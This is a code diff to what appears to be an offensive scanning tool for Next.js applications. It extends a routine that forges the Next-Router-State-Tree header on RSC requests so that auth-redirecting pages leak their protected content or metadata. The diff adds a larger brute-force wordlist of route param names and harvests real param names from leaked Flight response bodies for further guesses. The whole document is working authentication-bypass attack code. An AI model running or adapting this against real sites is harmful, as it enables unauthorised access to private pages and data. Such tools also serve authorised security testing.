@@ -91,17 +91,50 @@ export const computeLegacyRscKey = (
 /**
  * Common dynamic route param names to guess when the last ancestor segment might be a
  * dynamic route (e.g. `[org]`, `[id]`) rather than a static one. Bounded to keep the
- * per-candidate request count small; a miss just falls through to the next guess.
+ * per-candidate request count small; a miss just falls through to the next guess. Worst
+ * case per candidate URL: `(2 static attempts + this list's length)` guesses, each up to 2
+ * key modes (legacy/strong) and up to 2 leaf modes (page/metadata-only) — i.e. roughly
+ * `(2 + 20) * 2 * 2 = 88` requests before any RSC-body harvesting fallback (see
+ * `extractParamNameCandidatesFromFlightBody`) kicks in, which only spends further requests
+ * when this list's guesses all fail AND harvesting actually turns up a new name, capped by
+ * `--rsc-param-bruteforce-limit`.
  */
-const COMMON_DYNAMIC_PARAM_NAMES = ["id", "slug", "org", "tenant", "username"] as const;
+const COMMON_DYNAMIC_PARAM_NAMES = [
+    "id",
+    "slug",
+    "org",
+    "orgId",
+    "organization",
+    "tenant",
+    "tenantId",
+    "username",
+    "userId",
+    "user",
+    "account",
+    "accountId",
+    "workspace",
+    "workspaceId",
+    "project",
+    "projectId",
+    "team",
+    "teamId",
+    "handle",
+    "name",
+    "key",
+] as const;
 
 /**
  * Ancestor-segment claims worth trying per candidate path: first segment only, every
  * segment but the leaf (both as plain static segments), and — for the latter, since a
  * static-segment guess can never match a real dynamic route — the same set with its last
- * segment additionally tried as each of `COMMON_DYNAMIC_PARAM_NAMES`.
+ * segment additionally tried as each of `paramNameCandidates`. Defaults to
+ * `COMMON_DYNAMIC_PARAM_NAMES`; `next_routerStateForge` also calls this with RSC-body-
+ * harvested names as a fallback when the default list's guesses all fail.
  */
-export const buildAncestorAttempts = (pathSegments: string[]): AncestorSegment[][] => {
+export const buildAncestorAttempts = (
+    pathSegments: string[],
+    paramNameCandidates: readonly string[] = COMMON_DYNAMIC_PARAM_NAMES
+): AncestorSegment[][] => {
     if (pathSegments.length === 0) return [];
     const attempts: AncestorSegment[][] = [[pathSegments[0]]];
     const allButLeaf = pathSegments.slice(0, -1);
@@ -110,7 +143,7 @@ export const buildAncestorAttempts = (pathSegments: string[]): AncestorSegment[]
 
         const withoutLastAncestor = allButLeaf.slice(0, -1);
         const lastAncestorValue = allButLeaf[allButLeaf.length - 1];
-        for (const paramName of COMMON_DYNAMIC_PARAM_NAMES) {
+        for (const paramName of paramNameCandidates) {
             attempts.push([...withoutLastAncestor, { paramName, value: lastAncestorValue }]);
         }
     }
@@ -130,6 +163,59 @@ export const containsNextRedirectMarker = (body: string): boolean => body.includ
 export const extractChunkPathsFromFlightBody = (body: string): string[] => {
     const matches = body.matchAll(/(?:_next\/)?static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
     return [...new Set([...matches].map((m) => m[0]))];
+};
+
+/** Object-key-shaped identifiers that show up next to arbitrary string values in a Flight
+ * payload without being the real dynamic-route param name — prop/DOM-attribute-like keys
+ * that would otherwise slip past the value-anchored pattern below. `id` is included
+ * deliberately: it's already in `COMMON_DYNAMIC_PARAM_NAMES`, so a harvested `"id":"<value>"`
+ * hit would only ever duplicate an attempt already made. */
+const PARAM_NAME_CANDIDATE_NOISE = new Set([
+    "children",
+    "className",
+    "key",
+    "ref",
+    "type",
+    "props",
+    "default",
+    "name",
+    "title",
+    "description",
+    "href",
+    "src",
+    "id",
+    "digest",
+]);
+
+/**
+ * Extracts candidate dynamic-route param names from a Flight/RSC response body already
+ * fetched during a failed forge attempt. Two anchored patterns, deliberately narrow to keep
+ * the false-positive rate — and therefore the number of extra requests this feeds back into
+ * `buildAncestorAttempts` — low:
+ *
+ * 1. **Value-anchored key extraction.** Flight serializes plain-object props passed to
+ *    Client Component boundaries as ordinary `"key":"value"` pairs, even though the payload
+ *    as a whole isn't valid JSON/JS. The crawl already knows the ancestor's literal *value*
+ *    (`knownValue`, e.g. `"acme-corp"`) but not its *key* — so a key quoted immediately next
+ *    to that known value is a strong signal for the real `[paramName]`.
+ * 2. **Bracket-source pattern (dev-mode only).** Next.js dev error/stack payloads embed
+ *    webpack module source paths verbatim, e.g.
+ *    `webpack-internal:///(rsc)/./app/organizations/[org]/layout.tsx` — the bracketed
+ *    segment there IS the real param name, no anchoring needed since `[name]` in a module
+ *    path is unambiguous by construction.
+ */
+export const extractParamNameCandidatesFromFlightBody = (body: string, knownValue: string): string[] => {
+    if (!knownValue) return [];
+    const escapedValue = knownValue.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+    const candidates = new Set<string>();
+
+    const anchored = body.matchAll(new RegExp(`"([A-Za-z_$][A-Za-z0-9_$]{0,40})"\\s*:\\s*"${escapedValue}"`, "g"));
+    for (const m of anchored) candidates.add(m[1]);
+
+    const bracketed = body.matchAll(/\/\[([A-Za-z_$][A-Za-z0-9_$]{0,40})\]/g);
+    for (const m of bracketed) candidates.add(m[1]);
+
+    return [...candidates].filter((c) => !PARAM_NAME_CANDIDATE_NOISE.has(c) && c.length <= 24);
 };
 
 /** Resolves an extracted chunk path (with or without a `_next/` prefix) to an absolute URL. */
@@ -210,6 +296,8 @@ const attemptForgeWithKeyFallback = async (
     return { ...strong, keyMode: "strong" };
 };
 
+const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
+
 /**
  * For each candidate page URL that redirects an unauthenticated request, retries as an
  * RSC fetch with a forged `Next-Router-State-Tree` claiming known ancestor segments are
@@ -221,11 +309,20 @@ const attemptForgeWithKeyFallback = async (
  * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
  * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
  * cleanly apply (e.g. a tenant-scoped layout).
+ *
+ * If every `COMMON_DYNAMIC_PARAM_NAMES` guess fails for both leaf modes, a bounded fallback
+ * kicks in (internal#158): every response body already returned by those failed attempts
+ * (no extra requests — it's information already paid for) is scanned via
+ * `extractParamNameCandidatesFromFlightBody` for the app's real param name. If that turns up
+ * any name not already in the fixed list, one bonus round of dynamic-guess attempts is tried
+ * with those harvested names (capped at `rscParamBruteforceLimit`; `0` disables this
+ * fallback entirely) — for each leaf mode, only if that leaf mode's fixed-list pass failed.
  */
 const next_routerStateForge = async (
     candidateUrls: string[],
     threads: number,
-    timeout: number = REQUEST_TIMEOUT_MS
+    timeout: number = REQUEST_TIMEOUT_MS,
+    rscParamBruteforceLimit: number = DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT
 ): Promise<RouterStateForgeResult> => {
     const bypassedUrls: string[] = [];
     const metadataOnlyBypassedUrls: string[] = [];
@@ -252,38 +349,62 @@ const next_routerStateForge = async (
             }
         };
 
+        // The literal value of the ancestor segment that a dynamic-route guess would target
+        // (same one `buildAncestorAttempts` re-tries as each candidate param name), used to
+        // anchor RSC-body harvesting. `undefined` when there's no such candidate slot at all
+        // (matches `buildAncestorAttempts`'s own guard).
+        const allButLeaf = segments.slice(0, -1);
+        const lastAncestorValue =
+            allButLeaf.length > 0 && allButLeaf.join("/") !== segments[0]
+                ? allButLeaf[allButLeaf.length - 1]
+                : undefined;
+        const harvestedNames = new Set<string>();
+
         const ancestorAttempts = buildAncestorAttempts(segments);
 
-        let bypassed = false;
-        for (const ancestors of ancestorAttempts) {
-            const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, "page", timeout);
-            if (result.success) {
-                printMsg(
-                    MSG.Run,
-                    `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
-                );
-                bypassedUrls.push(candidateUrl);
-                if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
-                recordChunks(result.body);
-                bypassed = true;
-                break; // one successful ancestor claim per candidate is enough
+        /** Tries every attempt in `attempts` under `leafMode`, harvesting param-name
+         * candidates from each body along the way; returns true and records the hit on the
+         * first success. */
+        const tryAttempts = async (attempts: AncestorSegment[][], leafMode: LeafMode): Promise<boolean> => {
+            for (const ancestors of attempts) {
+                const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout);
+                if (lastAncestorValue && result.body) {
+                    for (const name of extractParamNameCandidatesFromFlightBody(result.body, lastAncestorValue)) {
+                        harvestedNames.add(name);
+                    }
+                }
+                if (result.success) {
+                    const verb = leafMode === "page" ? "revealed content" : "revealed metadata";
+                    const prefix = leafMode === "page" ? "Forged next-router-state-tree bypass" : "Forged metadata-only next-router-state-tree bypass";
+                    printMsg(
+                        MSG.Run,
+                        `[✓] ${prefix} ${verb}: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
+                    );
+                    (leafMode === "page" ? bypassedUrls : metadataOnlyBypassedUrls).push(candidateUrl);
+                    if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
+                    recordChunks(result.body);
+                    return true;
+                }
             }
-        }
+            return false;
+        };
+
+        /** Bonus round of dynamic-guess-only attempts built from names harvested so far but
+         * not already covered by the fixed wordlist; `[]` (no-op) if nothing new was found
+         * or the fallback is disabled. */
+        const harvestBonusAttempts = (): AncestorSegment[][] => {
+            if (rscParamBruteforceLimit <= 0) return [];
+            const newNames = [...harvestedNames].filter((n) => !COMMON_DYNAMIC_PARAM_NAMES.includes(n as never));
+            if (newNames.length === 0) return [];
+            return buildAncestorAttempts(segments, newNames.slice(0, rscParamBruteforceLimit)).slice(2);
+        };
+
+        let bypassed = await tryAttempts(ancestorAttempts, "page");
+        if (!bypassed) bypassed = await tryAttempts(harvestBonusAttempts(), "page");
         if (bypassed) return;
 
-        for (const ancestors of ancestorAttempts) {
-            const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, "metadata-only", timeout);
-            if (result.success) {
-                printMsg(
-                    MSG.Run,
-                    `[✓] Forged metadata-only next-router-state-tree bypass revealed metadata: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
-                );
-                metadataOnlyBypassedUrls.push(candidateUrl);
-                if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
-                recordChunks(result.body);
-                break;
-            }
-        }
+        let metadataBypassed = await tryAttempts(ancestorAttempts, "metadata-only");
+        if (!metadataBypassed) await tryAttempts(harvestBonusAttempts(), "metadata-only");
     });
 
     return {
